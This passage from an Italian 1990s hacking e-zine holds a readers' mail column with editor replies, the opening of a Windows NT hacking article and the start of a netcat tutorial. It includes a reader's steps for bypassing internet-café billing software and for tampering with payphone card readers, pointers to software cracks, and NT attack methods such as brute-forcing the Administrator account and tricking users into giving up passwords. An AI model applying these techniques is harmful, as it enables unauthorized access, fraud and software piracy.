continuate perche' gli argomenti sono interessanti;

[Interessante ? Ma smettiamola, sono solo cazzate.]

continuate perche' e' in italiano ed e' italiana.

[In Italiano ? Ma hai visto come scriviamo ?]

Ma sopratutto continuate perche' cazzo, imparato di +
leggendo bfi che all'universita', mah dipendera' dal 
sistema ... mmmmm ...  forse ... forse.

Ciao alla prossima ... :)

[Imparato piu' che all'universita' ?? Straaaaaano =)]


Deheheh le ultime parole famose da parte di Rigor MorteM:

"Ringrazio per il tuo interessamento, veramente gentile da parte tua.
Sinceramente pensavo che foste tutti sparpagliati ma per fortuna mi
sbagliavo!"

Eh si, siamo proprio organizzati =)

[2] "Informazioni" da Sergio

Ciao a tutti,
sono uno dei (spero) tanti lettori del vostro numero di bfi
e ho trovato un sacco di cosette interessanti.
avrei pero' un paio di domande da farvi...
nell'articolo su come sproteggere i giochi si parla di un programma di
nome virtual-cd. dopo innumerevoli tentativi, non sono riuscito a
reperirlo in rete. Sapete dirmi dove posso recuperarlo? Ultima domanda:
premesso che mi sono letto anche il vostro secondo numero, c'e' in giro
qualche numero ancora?

[Faremo il possibile per metterlo online sul nostro sito...]

[3] "Richiesta" da Pippo de Pippis

mi e' capitato di trovare " roba " vostra in giro per la rete,
vorrei farvi una richiesta :
visto che non sono riuscito a trovare un crack per un programma
( per i programmi italiani e' difficile reperire crack ), potreste 
farmelo voi ?
il programma e' WZIP della  C.H. OSTFELD, e' evidente che non parlo del
winzip.

 grazie comunque anche in caso di risposta negativa        ciao

[Mmm non e' che facciam crack a richiesta, io personalmente son scazzato
e non c'ho voglia, comunque se devi usare i file compressi io consiglio
sempre Windows Commander (http://www.ghisler.com) che gestisce i file
compressi e mooooolto di piu'...
dovrei farmi pagare x la pubblicita' che ci faccio a wincmd =)]
[Senti maaaaaaaaaaa dove ti e' venuto in mente il nick ? che fai mi EMULI?]

[4] "Piccolo Contributo" di Blum

Leggendo il numero 2 di BFI e precisamente l'ultima parte
dell'introduzione mi venuto in mente un libro da consigliare a tutti:
'Scherzando con Mr. Feynman'. Oltre all'etica riporta considerazioni su
come aprire i lucchetti se si e' dimenticati la chiave 8oD

[Grazie per l'(ec)citazione letteraria, la rigiriamo ai lettori]

[5] "Salve!" di Nicola

Innanzitutto, complimenti per la vostra enciclopedia,(posseggo i primi due
numeri) vi contatto per chiedervi un favore(o piu')... , io ho installato
Mqmc32 2.01 (contascatti) e volevo sapere se avevate una patch per
cracckarlo o sapete dirmi come devo fare...

poi volevo chiedervi se esiste un programma che craccka tutti(o quasi) i 
programmi shareware....

Grazie per l'attenzione e per le risposte ( se me le darete )

[WOW addirittura Enciclopedia =) mmm vediamo allora del Mqmc mi sa che non
l'abbiam fatto il crack.
Per quanto riguarda invece il programma che crakka tutto e' la classica
boiata che usano per spacciare virus o (tendenza piu' recente) troiani.
NON ESISTONO programmi che crakkano tutto e che sanno anche cucinare la
pasta =))
Se proprio vuoi scaricarti qualcosa (non ricordo il loro sito :-( prenditi
l' OSCAR della Phrozen Crew, contiene moltissimi codici e crack.]

[6] "Cazzo ma non si puo' cosi'" di Giovanni

Sto' impazazando seguendo le istruzioni riportate su BFI di Febbraio sto
tentando di crakkare quake 2 attrezzi del mestiere W32dasm 8.9 e Windows
commander rinomino il file lo apro con W32 ma mi spunta tutto scrittoin
ascii e non posso seguire piu' le istruzioni

Aiutatemi vi prego o sommi saggi hacker

[Certo o sommo fedele, il fatto e' capire qual e' il tuo problema =)
Allora rinomi il file, lo apri col wdasm ed esci scritto in ascii ??
e' da vedere cosa intendi x ASCII se esce una roba tipo

Disassembly of File: notepad.exe
Code Offset = 00000400, Code Size = 00003A00
Data Offset = 00003E00, Data Size = 00000400

Number of Objects = 0006 (dec), Imagebase = 00400000h

   Object01: .text    RVA: 00001000 Offset: 00000400 Size: 00003A00 Flags: 60000020
   Object02: .bss     RVA: 00005000 Offset: 000000

etc........
allora va bene, se ti escono dei caratteri alla cazzo, tipo disegnini, devi
settare il font giusto (hai su il wingdings invece di uno sensato =))

Pero' mi suona strana la frase "non posso piu' seguire le istruzioni", guarda
che il WDasm non e' come il S-ICE che avanzi nelle istruzioni passo passo, o
meglio lo si puo' fare (sui 32bit) ma la funzione base e' mostrare il
disassemblato e permetterti di vedere le CALL e i JUMP (le so-called Cross
References o Riferimenti incrociati x i non anglofoni), oltre che trovare
le stringhe, i menu etc..
Riprova e sarai piu' fortunato =)]

[7] "SIETE FORTI!" di Francesco

raga' siete una bomba lo sapete..? complimenti la vostra rivista e'
davvero forte.. io ho 13 anni ho il pc da 2 anni..pero' sono gia' un giovane
programmatore...:) ho anche 4 siti internet..1 sulla chitarra..1 sui file
midi...1 sugli mp3...1 su di me...

[Beh quello sugli mp3 puo' interessare =PP ]

<cut..>
come faccio a intrufolarmi nel pc di un'altro?? cioe' so
qualcosa..io so' che e' possibile tramite il download..e + il download e'
lungo + tempo hai poi so che si puo' fare solo se il percorso del download non
occupa tutti i 128 caratteri che i sistemi operativi a 32 bit mettono a
disposizione giusto??? mi spigate pero' in pratica come si fa?? ve ne sarei
mooolto grato.

[Mmm 13 anni ma vai gia' giu' di droghe pesanti eh ? =)) Cos'e' sta storia
del download ?!? Mai sentita, vabbe' che io non faccio hacking su *nix
ma non l'ho mai sentita comunque =)) Che sia il delirio di un hacker morente?
Direi che ci sono metodi meno "esotici" =) come puoi leggere sul nostro BFi]

Ah volevo dirvi....che io praticamente ho intenzione di
modernizzre l'italia..qui siamo molto indietro e la cosa non mi
piace....per la loro tecnologia odio gli americani anche se vorrei avere
la tecnologia e io voglio fare conoscere l'italia in tutto il
mondo!UHUHAHHAHAHAHA e sono solo al primo passo del mio lungo cammino pero'
se in due anni ho fatto questo e so 3 linguaggi di prog. chissa' fra venti
anni ehhehe. beh grazie e arrivederci

[Azz avevo ragione eran proprio droghe pesanti, questo qui vuole conquistare
il mondo HIHIHI sai chi mi ricordi, hai presente il cartone animato della
Warner Bros (mi pare) dei looney toons dove ci sono il Prof. e Mignolo che
vogliono conquistare il mondo ? ? ? eh eh eh stai attento o parlando cosi'
da pazzoide rischi che ti diano la Presidenza del Consiglio HAHAHAH]

[8] "167-fucktim" di MacGiver

BUON GIORNO ITALIA....
Questo messaggio sarebbe inviato a  Cavallo de Cavallis
[Eccomi puff puff...]

Allora... in data oggi ho iniziato a fare numeri di telefono a tutto
andare (167-295xx3) per trovare le famose xx... al numero 14 mi ha
risposto un operatore, al 31 sembrava un modem e nel terminale (super
terminal di win) mi e' venuto vuori una schermata di upload files!

[I'm sorry come gia' ti dissi in mail privata non sono quelli i numeri,
dai giochiamoli al lotto =)) Comunque 2 numeri in meno, ne restano 98 =))
Interessante la cosa della schermata di upload....]

[9] "Complimenti e una piccola richiesta" di Maurizio

Innanzitutto complimenti vivissimi per gli argomenti trattati e per il
modo in cui sono affrontati; spero che le pubblicazioni siano molto piu'
frequenti... A proposito a che punto siamo con il N.3? Per un divoratore
di notizie come me ce ne vorrebbe uno al giorno, ma tralasciamo...

[Ehm saremmo al 4, evviva la puntualita' di risposta..]

Ecco la mia piccola richiesta:
mi piacerebbe sapere se c'e' una procedura standard
per il cracking dei prodotti Microsoft. Mi spiego: non mi interessa ne' il
crack, ne' i numeri seriali, quelli gia' ce li ho, vorrei solo non doverli
riscrivere ogni volta che installo questi beneamati programmini. Sperando
di vedere pubblicato un articolo sull'argomento, magari sul fatidico N.3
vi saluto e vi ringrazio anticipatamente.

[Mmm domanda interessante, sfortunatamente io uso Win95 prima release agg.
di win31 e ho Office 95 e nel primo caso si poteva skippare la richiesta
codice mentre nel secondo caso manco lo chiedeva (mi pare)...
Non so magari c'e' qualche DLL amichevole, ma non so nulla per ora, l'unica
cosa che so e' che se pigliate il PwlHack (leggetevi il mio articolo sui
file pwl) trovate i bytes da patchare che permettono di avere tutte le pass
legali (dei pwl se non erro) e i PWL non criptati (ma non l'ho mai provato..)
Se qualcuno ha idee mandi pure una mail..]

P.S. Purtroppo questo e' tutto quello che posso fare in quanto non
dispongo di sorelle o cugine come la plurimenzionata velina di Striscia
;-)

[Slump non apprezzera'... =))]

[10] "Quale Sito ?" da Skualo

Devo comunque  darvi un suggerimento. Su internet guide che trattano i vostri
argomenti
se ne trovano a migliaia! Perche' non scrivete qualcosa di diverso?

[Mi spiace dover dissentire ma detto con tutta calma KOLKAZZO che trovi
migliaia di guide su quel che scriviamo, si', ci sara' qualche articolo
che magari trovi da altre parti, ma ci sono molti spunti interessanti,
novita' (e non venirmi a dire che cose tipo il progetto carogna, o il mio
articolo sulla tim o quelli di phreak o altro li trovi da altre parti (e se
li trovi son probabilmente i nostri rippati) e altre cose che ritengo molto
valide, che poi possano interessare o meno e' un altro discorso.
Comunque noi facciamo del nostro meglio per darvi un servizio decente, e non
mi pare come gia' detto che sulla nostra e-zine ci siano solo articoli gia'
reperibili in internet.]

 Per esempio spiegate passo passo come usare cracker jack oppure john the
ripper...perche' sempre facile, ma in realta' nessuno ci capisce un cazzo.

[Bah ho qualche dubbio anche xche' c'e' chi lo usa tranquillamente, senza
contare che qualche dannato TXT ci sara' dentro no ?!? io non lo uso MAI
il jack ma non mi pare ci voglia un corso...]

spiegate punto per punto come utilizzare un satan,

[non so come e' messo il satan come docs ma anche li vedo fratelli che lo
usano..]

e inserite anche un vocabolario che spieghi tutti i termini... nuke...
clone.. root...ect.

[Vabbe' e vorresti dire che di queste cose non ce n'e' in giro ? Mi cadi in
basso, ho visto un TROIAIO (o migliaia come dici tu) di guide che parlavano
di come fare hacking per newbies, le basi etc.. etc.. e come ti ripeto mi
pare che il livello di bfi sia leggermente superiore come complessita' e
interesse, certo qualche articolo sara' piu' semplice, ma si cerca di essere
il piu' completi possibili..
Chissa' se qualcuno di noi preso da enorme scazzo si decida a fare una guida
per spiegare "queste cose che da altre parti non si trovano" (basta essere
convinti =)) come il significato di root e di nuke..]

[11] "leggeteve questa" by Naif

circa l'articolo di goku mi pare sui netcafe'....
ha parlato del programma net fun time control e ha detto se permettete un
branco di cazzate fenomenali! x ciullarlo quel prg non servono le *.pwl di
windows ne tantomeno le password sono localizzate all'interno della
makkina( ammetto ke esiste un file uguale x tutte le distrib di net fun
time controll ke si kiama codici-omaggio.txt ma sono poki e non sono
validi).e  tutti i netcafe'sono firewallati! x ciullare quel programma
basta andare sull'internet explorer e fare file://c:\windows\explorer.exe
poi andare a modificare la voce della shell nel c:\system.ini
ripristinando l'originale e mettere un link a net fun in esecuzione
automatica cosikke si resetta il pc e al riavvio tenendo premuto il tasto
shift non partono i programmi in esecuzione automatika e avete windows95
completamente free in rete...allorke' l'admin si avvicinasse basta avviare
net fun time controll ke si bekka dal tasto avvio/programmi/net fun time
controll/netfun. un' alternativa e' fare questo editing rebbootando la
makkina e mentre i processi
 nell'autoexec vengono eseguiti premere ctrl-C terminare la procedura di
batch e con l'edit del dos fare quello ke ho descritto sopra! non dico ke
debba essere pubblicata sta robba ma almeno informate il tizio ke ha fatto
l'articolo ke se informi prima de scrive le cose!!!kapito!!! 

[Ecco pubblicata la tua correzione, non so se sia giusta, non ho tempo di
checkare, non sento goku da un po' quindi non posso chiedere cosa ne pensa,
quindi non faccio altro che metterla qua, casomai serva...]

[12] "Pubblicazione Articolo" di Ragazzo Bulo

Potete pubblicare un articolo che parla dei patch e crack, di come si
fanno e che progs si usano? Thank... Ah, quando esce il prossimo BFI
(BFI3)?

[Beh per trovare i byte da crakkare mi pare che qualche articolo sia gia'
stato scritto; se vuoi sapere invece come andare a rendere definitivo il
crack o ti segni i byte e poi ti fai un programmino (per es. quello fatto
da Xoanon in pascal (o guardate quello messo da Slump (preso dalla guida
di The Keyboard Caper)). Personalmente io uso il bel RTD_PATCH (dovreste
trovarlo, se esiste ancora, su cracking.home.ml.org) che confronta i file
(modificato e original) e butta l'output su .PAS, .CPP, .ASM o .COM (se
ricordo bene), quindi poi lo passi al tuo compiler preferito o usi direttam.
il COM]

[13] "BFI" + "Per Spirit" + "Per Pigpen"  di Squash

[e quante caz sono ? =)]

Hi!
Buon lavoro ragazzi!
Posso essere avvisata appena escono nuovi numeri di bfi?
Non ci sono novita' sui greenz?

[WOW una ragazza, come sei messa? Ma sei libera? ehm vabbe' lasciamo stare
comunque per i greenz : come diceva il Trap : "Non parlo mai dei singoli" e
io sono daccordo completamente a meta' col mister =)))]

"Per Spirit"
Fortunatamente non tutte le ragazze abbocchiamo cosi' facilmente... ma mi
piace il tuo modo di fare....... Ma mi spieghi perche' non parlate anche
di voi ragazzi visto che gli hackerz non siete solo uomini? Cmq ci credo
che il modello Di Caprio non va piu'!!!! Sara' anche carino, interpreta
una bella parte nel film, ma e' poco piu' che un bambino!

[Perche' non ce ne parli tu cara hackeressa ? =)]

Tu che dici di avere cosi' tanto successo con le ragazze, quanti anni hai?

[Mmmm si potra' dire ?? Vabbe' se vuole te lo dice in privato..]

"Per Pigpen"
Niente gif di noi mentre siamo nudi????
Pazienza volevo mandartela..... cmq io la tua la accetto se me la
mandi.... potrei diventare una tua "ammiratrice"

[Bah gli chiedero', ma mi pare sia okkupato.
Io comunque la accetto volentieri =P sai dove mandare no ?]

Byez  dall'unica (credo di essere sola) ragazza che gira perennemente
 qui in mezzo!!!!!

[E' un piacere sapere che anche il sesso (non debole non mi permetto =))
femminile ci legge su queste pagine]

[14] Senza Subject xche' costa (questo lo dico io by Cav) by Thatsy

[Premessa : Mail divertente, la metto dai =))]

Illustrissima ed eccellentissima redazione di bfi ,
mi complimento con voi per la vostra zine (senno' mi cestinate subito,
come caz zo si cestina una mail ???), finalmente possiamo leggerci
qualcosa di carino e imparare tante cose nuove :). Ho appena letto il
numero 3 e gli speciali estivi senza pero' trarne alcun giovamento (leggi
niente bottarella ,manco alla figlia di fantozzi) , ho deciso di scrivervi
per incoraggiarvi a continuare il vostro lavoro (lo so che non ve ne 
frega una mazza del mio incoraggiamento ,ma almeno faccio numero :) ).
Avrei 2 richieste da farvi : 1)Un buon libro di c/c++ da frega' ehmm....
compra' per capirci qualcosa dei beiprogrammini che scrivete e del kernel
di linux (fare il copiers a vita limitandomi a cut&pastare e compilare e'
veramente frustrante ,poi come si dice COPIERS+ LAMERS=MERDERS, mmmhhh....
che puzza ,apro la finestra :) )

[Ooohh finalmente qualcuno con dei buoni propositi, questo insegna che
almeno qualcuno che ci capisca esiste =))
Libri da consigliare ? Mmm non sono ne' le persona migliore per consigliare
libri soprattutto sul C (si vi domanderete xche' rispondo alle mail io, la
risposta e', non han trovato nessun altro bischero =)) cque dicevo, se
leggete gli articoli di FuSyS di solito c'e' il riferimento ai libri su cui
il nostro prode (o prude ?) eroe ha attinto vitali infoz.
Che altro dire ? beh se qualcuno vuole regalarmi per natale i classici
"TCP/IP Illustrated" io lo apprezzo volentieri ]

 postmetto (eheh) cheho pure fatto l'esame
di c++ con un buon voto ma non ci capisco ugualmente una  mazza e non ho
copiato all'esame.

[e questo dimostra quanto valgono gli esami all'universita'...]

2)Come si mette su un vhost (capisco che puo' essere pericoloso tutto cio'
,e   che rischiamo di vedere in IRC orde di ragazzini con ip
@lacosapiudivina.e'farsilacugina.org(asmo) io non ce ne
ho manco una ARGHHHHHH.

[azz mi prendi in castagna (basta che non me la infili <tusaidove> =)) come
voi tutti saprete io non hakko unix e affini, ergo non so un gesu' di vhost,
vedro' di chiedere a chi di dovere MA non so se qualcuno avra' voglia di
fare un articolo, certe cose non si dicono neanche alla mamma hihi]

Beh , sperando in una risposta ,vi ringrazio e provo e rileggermi per
l'ennesima volta la trilogia (eeeeeeeee che parolone) di BFI ,magari
capisco un'altra riga.

                                     ciao , thatsy.

P.S.(We non travisate l'ironia della lettera ,e' che voi fate sbiella'
dalle ri sate ,magari se m'embucate in un trafiletto non sfiguro).

[Nooo figurati =)]

P.P.S. Dite a |scacco| che conscenza se scrive senza la i 

[Si' pero' anche tu.... si scrive senza la "i", ma la "o"  mettila =)]

(vedi intro di bfi3) spero che abbia la ragazza senno' dovrebbe rileggere
l'articolo di SPIRIT su bfisum.

[Piu' che il bfisum al buon |scacco| servirebbe rivedersi il checksum del
cervello HIHI]

<cut...>

P.P.P.S.    ave atque vale  :)

[Ehm, ricordo poco del latino, ma lo piglio <in senso figurato!> per bono]

[15]  "jack mkcrack" by XXX

Ciao ragazzi, e' un piacere scrivervi e in qualche modo sono anche un po'
emozionato; vi volevo fare i complimenti per la vostra zine e sapere se al
momento ne sono attive altre ( sempre in it ) Cmq a parte cio' volevo
sapere come poter duplicare le schede telefoniche e se era possibile,
perche' nell'articolo di jack mkcrack l'ha solo accennato.

[Mmm c'e' qualcuno che s'e' proposto x fare un articolo sulla copia delle
card MA dalle info che circolano (vedete anche su questo numero) parrebbe
che anche copiando una carta non serve a un cazzo, ma non sbilanciamoci.]

Scusate se sono un po' bischero, ma se tante volte voi conosceste qualcuno
che gli piace l'hacking ed e' un grosso appassionato di tutta questa
roba..... e e' di Arezzo o dintorni, VI PREGO FATEMELO CONOSCERE, sono solo
come un cane :( Vabbe' spero che non mi prendiate per scemo ma sono
semplicemente patito. Ok grazie di tutto Byez

[Avete sentito ? se qualche bonanima vuol mettersi in contatto col bischero
ehm col ragazzo mandatemi una mail che vi metto in contatto con lui =]

[16] "UnzUnz..." di Daniele

Siete semplicemente i migliori... Sara' una domanda di merda ma... dove
kazzo posso tovarvi in IRC???

[allora, in via teorica non ci siamo, in pratica se proprio insisti prova
a cercarmi su IRCNet nick Cavallo (chiedi prima se sono io xche' c'e' in
giro della gentaglia che usa il mio nick =)
P.S. Sono il 90% del tempo Busy e il 99% dei casi con banda piena quindi
non pretendete troppo ;-)]

devo almeno scambiare mezza parola con qcuno
di voi.. altrimenti mi sentiro' una merda a vita... (cosa cmq migliore ad
aver comprato almeno 1 programma MicroSozz originale con licenza originale
e augurio del venditore...)

[Cosa hai contro la Microsoft ? guarda che NOI TUTTI abbiamo acquistato
TUTTI i prodotti della Microsoft, incluso Microsoft Linux =)))]

VI PREGOOOOO. Lo scrivo perke' le mie reazioni
alla lettura delle vostre riviste sono cambiate nel corso del tempo.. 1
bfi1 <--- preplessita'... interesse... 2 bfi2 <--- contentezza, sorriso
sadico in viso, erezioni continue con ejaculazioni ripetute 3 bfi3 <---
Sintomi precedenti + bava alla bocca 4 N. Speciali  <--- Urla
forsennate... Autolesioni, stato di euforia eccessivo alternato a stati
comatosi dovuti a trauma cranici provocati da TESTA contro MONITOR e
HardCase, Glissamento da stati NEvrotici a Psicotici , Skizzzofrenici
Border e Paranoici (pensavo di avere l'FBi che suonava alla porta. ho
iniziato a insulare al citofono in americano Slangato, ed era la mia EX
(da quel giorno) ragazza), Sintomi di alcune droghe intesrescati e
moltiplicati... (allucinazioni e eufora di LSD + sballamento cannaiolo +
Ipertensione Cocainica + Crisi d'astinenza a Bfi (insetti (BUG) sotto la
pelle che rosicchiavano il mio OS, motivo per cui mi mettevo la seriale
nel kulo nel tentativo di usare una Firewall against them...) + overdose
da Bongino Eroinomane una volta finito di leggere tutto il leggibile...).

[Ecco un altro drogato =)]

SCRIVETEEEEEEEEEE KE KAZZO FACCIO ?? KE KAZZO LEGGO NEL FRATTEMPO?? vi
pregooo scriveeee velocemente.. o almeno ditemi dove posso trovarvi.. in
quale kazzo di srvr IRC ?!?!?! VI PREGOOOOOOUAAAARG GORGHIULEAEFSAKLDK
(scusate.. l'ennesima crisi.... STOP.)

[Aio' come gia' detto si fa il poxxibile, cioe' poco piu' di nulla =)]

[17] "Phreaking and help" di Doraemon

Vorrei sfatare un mito !!!!
Non e' vero che le cabine telefoniche, quando si inserisce una scheda,
contattano una qualche centrale per avere informazioni sulla stessa ! Ho
una grandissima esperienza di phreacking, anche se quando lo facevo non
sapevo nemmeno si chiamasse cosi'. Comunque adesso vi faccio un riassunto
e se vi puo' interessare scrivero' un articolo piu' dettagliato. Quando i
dinosauri abitavano la terra, bastava mettere un po' di nastro adesivo
sulla scheda per renderla eterna. Oggi si puo' ancora fare !!!!!! Starete
pensando: "questo e' un povero stronzo che non ha un cazzo da fare e viene
a romperci i coglioni per nulla", invece gli stronzi siete voi
(amichevolmente). Tutto sta' nel rimuovere il lettore di schede ( non c'e'
cosa piu' facile al mondo e forse questo lo sapete anche voi :)) fatto
cio' basta modificare la prima testina di lettura ( quella in basso ) con
un semplice taglierino ed il gioco e' fatto.
La "rete intelligente" NON ESISTE, fidatevi.

[Prendiamo atto delle tue affermazioni e ti aspettiamo con un articolo
dettagliato..]

---
Anche per questo numero mi sono bello che rotto i.. ehm dicevo ho assolto
al mio dovere (non avro' fatto troppo?), un sentito Buon Natale, Buon Anno
(mi raccomando Spakkatevi prestando il vostro corpo ad esperimenti chimici)
e se leggete questo numero che e' gia' il '99 basta siete in ritardo x voi
niente auguri e a letto senza cena =).

Mailly Yourz,
Cavallo "Overflow del cervello interno" de Cavallis


==============================================================================
----------------------------------[ HACKiNG ]---------------------------------
==============================================================================

--------------------------------[ HACKiNG NT ]--------------------------------
----------------------------------[ PARTE I ]---------------------------------
------------------------------[ Dark Schneider ]------------------------------

Hacking Neanderthal Tecnologies.....

Musica Ascoltata: Metal in Blood (fikissima compilation by Dark Schneider)
				  Metallica - Enter Sandman
				  Helloween - I Can
				  Blind Guardian - Mirror Mirror
				  Labyrinth - Lady Lost in Time
				  Rhapsody - Land of Immortals
				  Led Zeppelin - Whole lotta love
				  Judas Priest - Cathedral spires
				  Hammerfall - At the end of the rainbow
Consumo: Skifezze varie
	 Il solito litro di coca allungata con la fanta...

Pensierino della sera: Quando la sfiga ti attanaglia, fermati. Osserva
                       attentamente la tua mano destra, battila sulla
                       fronte e urla: "DOH!". Dopodiche' mettiti a mangiare,
		       sbava davanti alla televisione, fatti una settimana
		       ad oziare e dimenticati della sfiga...
                       tanto quando ti sarai ridotto cosi' farai skifo pure a
                       lei...

******* Fucking Standard Disclaimer: "man brain" & "RTFM" (fusys docet)******

Ebbene si', anke il peggior sistema operativo al mondo merita di essere
hakkato ^_^
Con questo vorrei dare il via ad una serie di articoli per guidare i newbies
di Winpuzz NT hacking da un livello minimo fino a deviazioni mentali tipo i
vari modulo Carogna o progetto onosendai di fusys, il guru di unix di BFi ^_^
Non so se ci riusciro' comunque spero apprezziate almeno il tentativo...
Winpulse NT e' teoricamente piu' sicuro di Unix (e qua molti avranno da
ridire), ma sottolineo TEORICAMENTE, perche' la sicurezza consiste nel non
lasciare fare praticamente nulla a nessuno....
Mi spieghero' meglio con alcuni esempi. Innanzitutto Wilddog NT non rende
disponibili molti servizi come telnet, ad esempio, e limita moltissimo la
possibilita' di interagire con il sistema operativo; non fornisce sorgenti
di alcun tipo a nessuno (piu' che altro per nascondere le paurose pecche di
programmazione), limitando di parecchio la nostra possibilita' di indagine.
Neppure l'Administrator ha il pieno controllo della macchina e il supporto
dei tool di sviluppo (C, Java o altri linguaggi) spesso non esiste affatto
o, se esiste, e' difficoltoso da utilizzare sia per accessibilita' che per
pesantezza di esecuzione (evviva il visual studio...:(
Tristezza.... Che fare dunque, ora che ci troviamo in un ambiente cosi'
diverso e inospitale?
Non disperare, per prima cosa, e per seconda mettiamo da parte in un angolino
del nostro cervello tutte le nostre esperienze unix (tante o poche che siano)
e procediamo.
Innanzitutto teniamo presente l'articolo di Cavallo sul file sharing, perche'
sara' la base di tutto: infatti la maggior parte delle nostre incursioni
cominceranno da li'.
Poi dovremo prendere in considerazione i vari tool a nostra disposizione,
perche' in mancanza di sorgenti dovremo per ora affidarci al lavoro di altri
(per ora non preoccupatevi, presto cominceremo a esplorare anke le winsock a
bordo del galeone s0ftpj, capitanati dal Deviato Animatore, col PazzO di
vedetta, il Cavallo al timone e il Super Protagonista Bellissimo -
cioe' io ^_^ - alla Bussola).
Allora partiamo e vediamo un po' com'e' fatto Winciaps NT.
Innanzitutto sappiamo che utilizza un modello di sicurezza a oggetti, cioe'
offre la possibilita' di rendere sicuro ogni file conservato sul server.
Ma cio' e' vero solo in parte.
Infatti e' sufficiente che un sysadm abbia settato i permessi su una directory
ma non sui files che contiene per permetterci di accedere a ciascun file in
essa contenuto, senza curarci dei permessi.
Il modello di sicurezza di Willow NT e' costituito da quattro componenti:
Local Security Authority, Security Account Manager (SAM), Secure Reference
Monitor (SRM) e User Interface (UI).
Piu' avanti li esamineremo in dettaglio, per ora vediamo di mettere in luce
alcuni difetti di questo sistema.
Proprio per la sua struttura di sicurezza il filesystem di NT da' la
possibilita' di settare i propri permessi a piacimento, quindi, una volta
ottenuto un accesso con diritti superiori e' possibile modificare tutti i
permessi lasciando una sola registrazione di audit. In pratica, una volta
Administrator, non dobbiamo preoccuparci + di tanto di backdoor et similia ^_^
Altro punto dolente: se si assicura ad un utente il pieno controllo di una
directory, anziche' dei permessi di lettura, scrittura, cancellazione e
creazione, tale utente riceve anche il permesso nascosto di File Delete Child.
Questo permesso permette di cancellare ogni file di sola lettura all'interno
di una propria directory e non sara' piu' possibile togliere tale permesso
all'utente, nemmeno dall'Administrator.
Interessante, senza dubbio, ma per ora possiamo farci ben poco. Vediamo
piuttosto se tra i componenti di sicurezza ci sono altri punti deboli o altro.
(Adesso per essere piu' chiaro faccio un bello schemino riassuntivo, che
chiariro' in seguito):

Local Security Authority (LSA)

Chiamata anke Security Subsystem. Gestisce le policies di sicurezza locale,
l'autenticazione degli utenti e la generazione dei registri e i messaggi di
auditing.

Security Account Manager (SAM)

Gestisce gli account degli utenti e fornisce il service di autenticazione degli
utenti per l'LSA.

Security Reference Monitor (SRM)

Garantisce la convalida degli accessi e l'auditing per l'LSA. Controlla	gli
accessi a file e directories bloccando o permettendo l'accesso in base alle
policies.

Adesso vediamo come funziona l'autenticazione degli utenti: prendiamo per
esempio il semplice logon di un utente.
L'utente cerca di collegarsi al sistema. Se NT riconosce account name e
password concede l'accesso (per adesso cerchiamo di vedere le cose dal punto
di vista "lecito", giusto per capire meglio).
Immediatamente NT crea un TOKEN, cioe' un oggetto a cui il Sistema Operativo
associa l'utente.
Ogni processo eseguito dall'utente viene associato al token e la coppia
processo-token viene chiamata "subject".
Salta immediatamente all'occhio che Wincows NT basa la maggior parte del suo
modello di sicurezza sugli utenti e i gruppi e i permessi che si assicurano a
tali utenti e gruppi. Vediamo allora come funzionano.
Quando si installa il server Winshows NT, il Sistema Operativo crea
automaticamente sei gruppi:
Administrators, Backup Operators, Guests, Power Users, Replicators e Users.
I sei gruppi corrispondono ai diritti d'accesso che si dovrebbero utilizzare
nella rete Winblows NT.
Administrators ha (ovviamente) accesso completo a ogni file e directory del
filesystem del dominio (=DIO...r00t rulez ^_^).
Ecco una lista dei gruppi di default:

Administrators - Diritti di accesso totali a ogni file e directory sul server
		 o del dominio
Backup Operators - Gli operatori di backup possono bypassare i controlli di
		   sicurezza sui file per eseguire operazioni di backup
Guests - Gli utenti del gruppo guests possono accedere alla maggior parte
	 delle directory del sistema ma senza permessi di scrittura o lettura.
Power Users - Di solito sono utilizzati per la condivisione delle stampanti,
              possedendo tutti i diritti degli utenti e qualche permesso in
              piu' per accedere alle directory di spooling e altre stronzate
              di files di sistema (mmm, interessante, non e' che ci si potra'
              far qualcosa?)
Replicator - Possono duplicare i file in un dominio da un punto a un altro,
             senza pero' poterne leggere o modificare il contenuto.
Users - La MASSA, gli utenti imbecilli(Murphy rulez?!)

Appare piuttosto evidente quali siano i gruppi piu' interessanti, cioe'
quelli di cui sarebbe opportuno acquisire i diritti. Ma come fare?
Per ora vediamo i metodi piu' ovvi, quelli che funzionano sempre^_^ :

- Brute forcing: una volta individuato l'account Administrator (che, badate,
  puo' essere rinominato...) si usa un bel programmino tipo NAT e lo si fa
  girare; il bello e' che l'account Administrator non puo' essere bloccato
  dopo n tentativi falliti....
- File Sharing: vedi articolo di cavallo sugli attacchi alla condivisione...
  Infatti una volta entrati in possesso del file delle password (vedremo poi
  come) lo si fa passare nel programma di crack e si aspetta con ansia la
  pass...^_^
- Social Engineering con i servizi Alerter e Messenger: spesso leggere i
  Fucked manuali puo' essere utile e in questo caso andarsi a vedere l'help
  dei servizi di alerter e messenger sarebbe una bella cosa: si possono
  inventare un sacco di modi per convincere un utente pirla a darci la sua
  password ^_^. Compito a casa: andate a leggervi l'help di questi due
  servizi....

Per adesso credo basti... quelle che ho scritto sono informazioni piuttosto
basilari, ma che sono necessarie e occorre prendere confidenza con esse per
capire quello che trattero' poi, cioe' Policies e Registry, il cuore di
Wincubus NT.

Alla prossima,
	Il Super Protagonista Bellissimo Dark Schneider

-----------------------[ NETCAT E SUE iMPLEMENTAZi0Ni ]-----------------------
----------------------------------[ pIGpEN ]----------------------------------

C0NSUM0: 1 cocacola, 1 panino morbido 
MUSiCA ASC0LTATA: Jeff Healey - Sound Barrier

SC0P0: Questo articolo ha lo scopo di insegnare ai NewBie cos'e' e come si usa
il netcat... Chi di voi gia' conosce il netgatto puo' passare ad altra
lettura.
Questo articolo e' scritto in forma semplice per una lettura scazzata e allo
scopo di mandare un FIN a tutti i newbie che continuano a chiedermi:
"Che cos'e' il netcat?"

Allora ...... CHe C0S'e' il NetCat ?

Il netcat non e' altro che un utility disponibile sotto Unix la quale permette
di stabilire e gestire qualsiasi tipo di connessione UDP o TCP.
Il suo funzionamento (a seconda della sintassi) puo' assumere la modalita'
client o server. Questa utility dal punto di vista dell'hacking puo' essere
utilizzata per eseguire anche degli script al fine di provocare un buffer
overflow (vedi imap e simili) oppure per fare lo scanning delle porte.

La modalita client e' naturalmente quella di piu' facile utilizzo. Nella sua
sintassi piu' misera troviamo soltanto il nome dell'host e la porta:

es.:
./nc localhost 25

stabilisce una connessione alla porta smtp del vostro computer.
A questo punto potrete dialogare semplicemente tramite i cmd tipici del
protocollo.

250 XXXX ESMTP Sendmail 8.8.7/8.8.7; Thu, 19 Nov 1998 12:34:51 +0100

helo localhost
250 Hello XXXX localhost [127.0.0.1], pleased to meet you
mail from: uno
